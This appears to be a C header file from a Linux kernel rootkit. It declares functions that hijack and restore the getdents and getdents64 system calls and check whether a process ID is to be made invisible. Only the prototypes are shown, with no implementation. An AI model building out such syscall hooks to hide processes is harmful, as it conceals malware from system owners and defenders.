long new_getdents64(const struct pt_regs *pt_regs);
long new_getdents(const struct pt_regs *pt_regs);
void hijack_getdents(void);
void restore_getdents(void);
int is_invisible(pid_t pid);